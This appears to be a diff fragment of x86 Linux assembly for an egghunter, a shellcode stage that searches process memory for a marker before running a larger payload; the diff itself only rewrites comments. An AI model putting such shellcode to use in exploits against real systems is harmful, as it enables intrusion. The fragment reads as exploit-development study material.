@@ -11,18 +11,18 @@ _start:
 	mov edi, 0x60609090	; store Egg
 	xor edx, edx		; clear edx
 next_page:
-	or dx, 0xfff		; 4095
+	or dx, 0xfff		; 4095 - PAGE_SIZE-1 to avoid nulls
 
 check_access:
-	inc edx			; Increment edx to 4096 (PAGE_SIZE)
+	inc edx			; Increment edx to 4096 (PAGE_SIZE), also used to iterate through memory
 	
 	;check access
 	xor eax, eax		; clear eax
 	mov al, 0x21		; syscall access
-	lea ebx, [edx+0x4]	; load 8 bytes to EBX to test access
+	lea ebx, [edx+0x4]	; load address to test access to the next 8 bytes
 	int 0x80		; execute syscall
 	cmp al, 0xf2		; check for EFAULT error code
-	je next_page		; if 0 then we've hit inaccessible memory, move to the next page 
+	je next_page		; if equal then we've hit inaccessible memory, move to the next page 
 
 	; check bytes
 	cmp [edx], edi		; check for first part of egg
